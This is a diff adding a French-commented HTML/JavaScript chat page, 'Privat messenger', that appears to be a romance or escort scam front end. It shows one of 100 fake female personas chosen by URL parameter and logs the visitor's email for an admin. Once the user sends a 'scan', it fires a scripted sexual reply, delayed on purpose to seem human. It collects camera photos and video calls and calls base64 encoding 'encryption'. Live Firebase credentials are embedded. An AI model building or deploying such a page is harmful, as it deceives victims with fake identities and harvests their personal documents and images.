@@ -1,0 +1,249 @@
+      <!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Privat messenger</title>
+  
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+  <style>
+    body { margin:0; font-family:"Segoe UI",Arial,sans-serif; background:linear-gradient(135deg,NavajoWhite,ivory,gray,khaki); height:100vh; overflow:hidden; }
+    
+    /* Header */
+    .chat-header { display:flex; align-items:center; gap:12px; padding:12px 15px; background:linear-gradient(135deg,oldlace,purple,deeppink,gray,yellow); color:black; position:relative; z-index:10; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+    .chat-header img { width:45px; height:45px; border-radius:50%; object-fit:cover; border:2px solid green; }
+    .chat-header div { flex: 1; }
+    
+    /* Zone de messages */
+    .chat-body { padding:15px; display:flex; flex-direction:column; gap:10px; overflow-y:auto; height:calc(100vh - 130px); padding-bottom:80px; scroll-behavior: smooth; }
+    .msg { max-width:75%; padding:10px 14px; border-radius:15px; font-size:14px; word-wrap:break-word; position:relative; box-shadow:0 1px 2px deeppink; line-height: 1.4; }
+    .left { background:violet; align-self:flex-start; border-top-left-radius:0; color: black; }
+    .right { background:salmon; align-self:flex-end; border-top-right-radius:0; color: linen; }
+    .msg img { max-width:100%; border-radius:10px; display:block; margin-top:5px; }
+
+    /* Input Bar */
+    .chat-input { display:flex; padding:10px; background:black; position:fixed; bottom:0; width:100%; align-items:center; box-sizing: border-box; }
+    .chat-input input { flex:1; padding:12px 15px; border-radius:25px; border:1px solid darkgray; outline:none; font-size: 15px; }
+    .chat-input button { margin-left:8px; width:45px; height:45px; border:none; border-radius:50%; background:#25d366; color:white; font-size:18px; cursor:pointer; display:flex; justify-content:center; align-items:center; transition: 0.2s; }
+    .chat-input button:active { transform: scale(0.9); }
+    
+    /* Vidéo */
+    #localVideo, #remoteVideo { position:fixed; top:70px; right:10px; width:120px; border:2px solid Orange; border-radius:10px; display:none; z-index:100; background:black; }
+    #remoteVideo { right:140px; }
+  </style>
+</head>
+<body>
+
+<div class="chat-header">
+  <img id="profileImg" src="">
+  <div>
+    <h3 id="profileName" style="margin:0;font-size:16px;">Chargement'.'.'.'</h3>
+    <small id="profileId" style="opacity:0.8;font-size:11px;"></small>
+  </div>
+  <button id="callBtn" title="Appel vidéo">🎥</button>
+</div>
+
+<div class="chat-body" id="chatBody"></div>
+
+<div class="chat-input">
+  <button id="photoBtn" style="background:Olive;">📷</button>
+  <input type="text" id="textInput" placeholder="Écrire un message...">
+  <button id="sendBtn">➤</button>
+  <input type="file" id="photoInput" accept="image/*" capture="environment" hidden>
+</div>
+
+<video id="localVideo" autoplay muted playsinline></video>
+<video id="remoteVideo" autoplay playsinline></video>
+
+<script>
+  
+//  CONFIGURATION FIREBASE
+
+const firebaseConfig = {
+  apiKey: "AIzaSyDIuRM5Eo6IVG_ghspnIQMcmAabgfcCn7k",
+  authDomain: "meet-ur-night-s-dominator.firebaseapp.com",
+  projectId: "meet-ur-night-s-dominator",
+  storageBucket: "meet-ur-night-s-dominator.firebasestorage.app",
+  messagingSenderId: "1021669198456",
+  appId: "1:1021669198456:web:31a62bb6003888060afb8d",
+  measurementId: "G-SFPWNFM8PY",
+  databaseURL: "https://meet-ur-night-s-dominator-default-rtdb.europe-west1.firebasedatabase.app"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+//  RÉCUPÉRATION PARAMÈTRES
+
+const params = new URLSearchParams(location.search);
+const imgNum = params.get("img") || "1";
+const email = params.get("email") || "inconnu";
+const userKeySafe = email.replace(/\./g, '_');
+const convKey = imgNum + "_" + userKeySafe;
+
+//  CRYPTAGE
+
+function utf8_to_b64(str){ return btoa(unescape(encodeURIComponent(str))); }
+function b64_to_utf8(str){ try{ return decodeURIComponent(escape(atob(str))); }catch(e){return str;} }
+function encrypt(text, key){ return utf8_to_b64(key + "::" + text); }
+function decrypt(cipher, key){ 
+  try{ 
+    let decoded = b64_to_utf8(cipher);
+    return decoded.includes("::") ? decoded.split("::")[1] : decoded; 
+  } catch(e){ return "Message protégé"; } 
+}
+const secretKey = btoa(email + "_KEY_" + imgNum).slice(0,16);
+
+// INITIALISATION PROFIL
+
+const profils = { 1: "Alessia", 2: "Alice", 3: "Angela", 4: "Arianna", 5: "Aurora", 6: "Beatrice", 7: "Benedetta", 8: "Bianca", 9: "Camilla", 10: "Carla", 11: "Carlotta", 12: "Caterina", 13: "Chiara", 14: "Claudia", 15: "Cristina", 16: "Daniela", 17: "Deborah", 18: "Denise", 19: "Diana", 20: "Elena", 21: "Eleonora", 22: "Elisa", 23: "Elisabetta", 24: "Emma", 25: "Federica", 26: "Francesca", 27: "Gabriella", 28: "Gaia", 29: "Giada", 30: "Giulia", 31: "Giorgia", 32: "Ilaria", 33: "Isabella", 34: "Laura", 35: "Lavinia", 36: "Lea", 37: "Letizia", 38: "Lidia", 39: "Lorenza", 40: "Lucia", 41: "Lucrezia", 42: "Ludovica", 43: "Manuela", 44: "Mara", 45: "Margherita", 46: "Maria", 47: "Marianna", 48: "Martina", 49: "Matilde", 50: "Michela", 51: "Miriam", 52: "Monica", 53: "Nadia", 54: "Nicole", 55: "Nicoletta", 56: "Noemi", 57: "Paola", 58: "Patrizia", 59: "Rebecca", 60: "Roberta", 61: "Rosa", 62: "Rosalia", 63: "Sabrina", 64: "Samantha", 65: "Sara", 66: "Serena", 67: "Silvia", 68: "Simona", 69: "Sofia", 70: "Sonia", 71: "Stefania", 72: "Stella", 73: "Susanna", 74: "Teresa", 75: "Valentina", 76: "Valeria", 77: "Vanessa", 78: "Veronica", 79: "Viola", 80: "Virginia", 81: "Viviana", 82: "Agata", 83: "Anita", 84: "Antonella", 85: "Asia", 86: "Bruna", 87: "Carmen", 88: "Carina", 89: "Cinzia", 90: "Costanza", 91: "Dafne", 92: "Emanuela", 93: "Fiorella", 94: "Gabriela", 95: "Gemma", 96: "Iolanda", 97: "Lara", 98: "Melissa", 99: "Rosanna", 100: "Stefania" };
+
+document.getElementById("profileImg").src = `IMAGE/img${imgNum}.jpg`;
+document.getElementById("profileName").textContent = profils[imgNum] || "Profil";
+document.getElementById("profileId").textContent = email;
+
+// --- Section Présence Admin Corrigée ---
+
+db.ref("active_sessions/" + convKey).update({
+  name: profils[imgNum],
+  userEmail: email,
+  imgNum: imgNum, 
+  
+  // <--- AJOUTÉ : Permet à l'admin d'afficher la bonne photo
+  
+  status: "online",
+  lastSeen: new Date().toLocaleString()
+});
+
+
+//  GESTION DU CHAT
+
+const chatBody = document.getElementById("chatBody");
+
+function renderSingleMessage(m) {
+  const d = document.createElement("div");
+  d.className = "msg " + (m.from === "admin" ? "left" : "right");
+  const content = decrypt(m.message, secretKey);
+  
+  if (content.startsWith("data:image")) {
+    d.innerHTML = `<img src="${content}">`;
+  } else {
+    d.textContent = content;
+  }
+  chatBody.appendChild(d);
+  chatBody.scrollTop = chatBody.scrollHeight;
+}
+
+// Variable de contrôle pour le message de bienvenue automatique
+
+let welcomeTriggered = false;
+
+db.ref("messages/" + convKey).on("child_added", (snap) => {
+  const msgData = snap.val();
+  renderSingleMessage(msgData);
+
+  // LOGIQUE : Si le scan (1er msg de l'user) arrive, l'admin répond auto
+  
+  db.ref("messages/" + convKey).once("value", (allMsgs) => {
+    if (allMsgs.numChildren() === 1 && msgData.from === "user" && !welcomeTriggered) {
+      welcomeTriggered = true;
+      const welcomeText = "Hi sweetie! 🫦 I received your scan. My services are now unlocked for you. Tell me, what are you looking for tonight? 🥵👅";
+      
+      // Petit délai pour simuler une réponse humaine
+      
+      setTimeout(() => {
+        db.ref("messages/" + convKey).push({
+          from: "admin",
+          message: encrypt(welcomeText, secretKey),
+          date: new Date().toLocaleString()
+        });
+      }, 1500);
+    }
+  });
+});
+
+// Envoi texte
+
+document.getElementById("sendBtn").onclick = () => {
+  const text = document.getElementById("textInput").value.trim();
+  if(!text) return;
+  db.ref("messages/" + convKey).push({
+    from: "user",
+    message: encrypt(text, secretKey),
+    timestamp: firebase.database.ServerValue.TIMESTAMP
+  });
+  document.getElementById("textInput").value = "";
+};
+
+// Envoi photo
+
+document.getElementById("photoBtn").onclick = () => document.getElementById("photoInput").click();
+document.getElementById("photoInput").onchange = (e) => {
+  const file = e.target.files[0];
+  if(!file) return;
+  const reader = new FileReader();
+  reader.onload = () => {
+    db.ref("messages/" + convKey).push({
+      from: "user",
+      message: encrypt(reader.result, secretKey),
+      timestamp: firebase.database.ServerValue.TIMESTAMP
+    });
+  };
+  reader.readAsDataURL(file);
+};
+
+//  VIDÉO WEBRTC
+
+let pc = null;
+const iceConfig = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };
+
+async function startCall(){
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
+    document.getElementById("localVideo").srcObject = stream;
+    document.getElementById("localVideo").style.display = "block";
+    pc = new RTCPeerConnection(iceConfig);
+    stream.getTracks().forEach(t => pc.addTrack(t, stream));
+    
+    pc.ontrack = e => {
+      document.getElementById("remoteVideo").srcObject = e.streams[0];
+      document.getElementById("remoteVideo").style.display = "block";
+    };
+    pc.onicecandidate = e => {
+      if(e.candidate) db.ref("calls/"+convKey+"/candidates/user").push(JSON.stringify(e.candidate));
+    };
+    const offer = await pc.createOffer();
+    await pc.setLocalDescription(offer);
+    db.ref("calls/"+convKey).update({offer: JSON.stringify(offer), status: "calling"});
+  } catch(err) { alert("Caméra non accessible"); }
+}
+
+document.getElementById("callBtn").onclick = startCall;
+
+// Appel Admin
+
+db.ref("calls/" + convKey + "/offer").on("value", async s => {
+  const offer = s.val();
+  if(offer && !pc) {
+    if(confirm("Appel vidéo entrant... Accepter ?")) {
+      const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
+      document.getElementById("localVideo").srcObject = stream;
+      document.getElementById("localVideo").style.display = "block";
+      pc = new RTCPeerConnection(iceConfig);
+      stream.getTracks().forEach(t => pc.addTrack(t, stream));
+      pc.ontrack = e => {
+        document.getElementById("remoteVideo").srcObject = e.streams[0];
+        document.getElementById("remoteVideo").style.display = "block";
+      };
+      await pc.setRemoteDescription(new RTCSessionDescription(JSON.parse(offer)));
+      const answer = await pc.createAnswer();
+      await pc.setLocalDescription(answer);
+      db.ref("calls/"+convKey).update({answer: JSON.stringify(answer)});
+    }
+  }
+});
+</script>
+</body>
+</html>
